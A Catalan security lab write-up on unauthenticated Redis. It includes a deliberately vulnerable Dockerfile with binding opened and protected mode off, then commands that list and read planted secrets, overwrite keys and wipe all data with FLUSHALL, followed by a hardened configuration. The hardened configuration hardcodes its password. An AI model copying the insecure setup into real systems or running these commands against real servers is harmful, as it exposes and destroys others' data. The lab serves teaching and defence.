# Vulnerabilitat 3: Redis sense autenticació

## Descripció Breu

Redis és una base de dades en memòria molt habitual en aplicacions web modernes. Per defecte escolta únicament a localhost (127.0.0.1), però és freqüent que administradors canviïn el binding a 0.0.0.0 per facilitar l'accés remot sense afegir cap contrasenya. Quan això passa, qualsevol atacant que pugui arribar al port 6379 té accés complet a totes les dades emmagatzemades: secrets, tokens, contrasenyes i sessions. Milers d'instàncies Redis han estat compromeses per aquest motiu, amb casos documentats d'exfiltració massiva de dades i instal·lació de miners de criptomoneda.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** → Lectura de totes les claus i valors emmagatzemats sense autenticació
- **Integritat** → Modificació o eliminació de qualsevol dada del servidor
- **Disponibilitat** → FLUSHALL elimina totes les dades en una sola comanda

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Alt |
| **CWE** | CWE-287 (Improper Authentication) |
| **CVSS estimat** | 9.1 (xarxa accessible, sense autenticació, impacte total) |
| **Versió afectada** | Qualsevol versió de Redis sense requirepass i bind 0.0.0.0 |
| **Exposició real** | Shodan mostra habitualment més de 20.000 instàncies Redis obertes a Internet |

### Escenari real
Un atacant escaneja la xarxa amb nmap cercant el port 6379 obert. Sense necessitat de cap credencial, pot connectar-se amb redis-cli i obtenir accés complet: llegir secrets d'aplicació, tokens d'API, sessions d'usuaris o fins i tot escriure fitxers al sistema si Redis té permisos d'escriptura.

---

## Implementació Vulnerable

```dockerfile
# Vulnerable: Redis sense autenticació exposat a totes les interfícies
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y redis-server

# Configuració vulnerable: escolta a totes les interfícies sense contrasenya
RUN sed -i 's/bind 127.0.0.1/bind 0.0.0.0/' /etc/redis/redis.conf && \
    sed -i 's/protected-mode yes/protected-mode no/' /etc/redis/redis.conf

# Dades sensibles per demostrar l'exposició
RUN service redis-server start && \
    redis-cli SET secret_key "contrasenya_admin_123" && \
    redis-cli SET db_password "mysql_root_pass" && \
    redis-cli SET api_token "tok_prod_xK92mNpQ" && \
    service redis-server stop

EXPOSE 6379

CMD ["redis-server", "/etc/redis/redis.conf"]
```

### Verificació de la vulnerabilitat

```bash
# Construir i executar el contenidor vulnerable
docker build -f Dockerfile.vulnerable -t seclab-vuln:redis .
docker run -d --name vuln-redis -p 6380:6379 seclab-vuln:redis

# Comprovar que Redis és accessible sense contrasenya
redis-cli -p 6380 ping
# Output esperat: PONG
```

---

## Com Explotar

### Pas 1: Descobrir el servei Redis

```bash
# Escaneig de ports amb nmap
nmap -sV -p 6380 localhost
# Output: 6380/tcp open redis Redis key-value store

# Connexió directa sense credencials
redis-cli -p 6380 ping
# Output: PONG (accessible sense autenticació)
```

### Pas 2: Enumerar i exfiltrar totes les dades

```bash
# Llistar totes les claus emmagatzemades
redis-cli -p 6380 KEYS "*"
# Output:
# 1) "secret_key"
# 2) "db_password"
# 3) "api_token"

# Llegir els valors de les claus sensibles
redis-cli -p 6380 GET secret_key
# Output: "contrasenya_admin_123"

redis-cli -p 6380 GET db_password
# Output: "mysql_root_pass"

redis-cli -p 6380 GET api_token
# Output: "tok_prod_xK92mNpQ"
```

### Pas 3: Modificar o destruir dades

```bash
# Modificar un valor existent
redis-cli -p 6380 SET secret_key "valor_manipulat"

# Eliminar totes les dades del servidor
redis-cli -p 6380 FLUSHALL
# Output: OK (totes les dades eliminades)
```

### Pas 4: Obtenir informació del servidor

```bash
# Informació completa del servidor Redis
redis-cli -p 6380 INFO server
# Output: versió, sistema operatiu, directori de treball, etc.

# Configuració actual del servidor
redis-cli -p 6380 CONFIG GET "*"
# Output: tota la configuració, incloent paths i paràmetres interns
```

---

## Solució

Restringir el binding a localhost, afegir autenticació obligatòria i desactivar comandes perilloses:

```dockerfile
# Fixed: Redis amb autenticació i binding restringit
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y redis-server

RUN useradd -m -u 1001 redisuser

# Configuració segura
RUN sed -i 's/bind 127.0.0.1 -::1/bind 127.0.0.1/' /etc/redis/redis.conf && \
    sed -i 's/# requirepass foobared/requirepass R3d1s_S3cur3!2024/' /etc/redis/redis.conf && \
    echo "rename-command FLUSHALL \"\"" >> /etc/redis/redis.conf && \
    echo "rename-command CONFIG \"\"" >> /etc/redis/redis.conf && \
    echo "rename-command DEBUG \"\"" >> /etc/redis/redis.conf

EXPOSE 6379

CMD ["redis-server", "/etc/redis/redis.conf"]
```

### Verificació de la correcció

```bash
# Intentar connexió sense contrasenya
redis-cli -p 6381 ping
# Output: NOAUTH Authentication required

# Intentar connexió amb contrasenya incorrecta
redis-cli -p 6381 -a "contrasenya_incorrecta" ping
# Output: WRONGPASS invalid username-password pair

# Connexió correcta amb la contrasenya configurada
redis-cli -p 6381 -a "R3d1s_S3cur3!2024" ping
# Output: PONG

# Verificar que FLUSHALL està desactivat
redis-cli -p 6381 -a "R3d1s_S3cur3!2024" FLUSHALL
# Output: ERR unknown command 'FLUSHALL'
```

---

## Bones Pràctiques

- Mai configurar `bind 0.0.0.0` sense afegir `requirepass` com a mínim
- Usar sempre `protected-mode yes` (actiu per defecte)
- Desactivar comandes destructives com FLUSHALL, FLUSHDB i CONFIG amb `rename-command`
- Si cal accés remot, usar un túnel SSH o VPN en lloc d'exposar Redis directament
- Actualitzar Redis regularment i escanejar amb Trivy per detectar CVEs coneguts
- Limitar l'accés al port 6379 amb regles de firewall (iptables, ufw)

---

## Referències

- [Redis Security Documentation](https://redis.io/docs/management/security/)
- [CWE-287 - Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [Shodan - Redis exposed instances](https://www.shodan.io/search?query=port%3A6379+redis)
- [OWASP - Sensitive Data Exposure](https://owasp.org/www-project-top-ten/)
